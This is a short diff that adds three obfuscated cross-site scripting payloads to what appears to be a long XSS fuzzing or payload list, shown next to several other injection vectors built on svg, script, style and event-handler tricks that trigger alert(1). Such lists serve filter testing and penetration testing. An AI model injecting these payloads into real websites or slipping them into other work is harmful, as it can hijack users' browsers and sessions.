@@ -1198,3 +1198,6 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <svg><script>alert(1)<br>
 <svg onresize="alert(1)">
 <style onreadystatechange="alert(1)">
+<body/onactivate=URL=name//
+<mArquee%20onStart%3D[~[onmouseleave(([[(alert(1))]]))]]%20]
+<svg><script /* /*/*/*>\u0061l\u0065rt`X`<
